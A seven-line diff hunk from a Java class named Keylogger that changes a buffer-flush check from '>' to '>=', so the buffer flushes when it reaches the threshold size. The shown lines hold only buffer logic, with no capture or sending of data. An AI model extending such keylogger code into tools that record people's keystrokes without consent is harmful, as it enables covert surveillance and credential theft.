@@ -98,7 +98,7 @@ public final class Keylogger {
 								buffer.wait();
 							}
 
-							if (buffer.size() > value) {
+							if (buffer.size() >= value) {
 								flush();
 							}
 
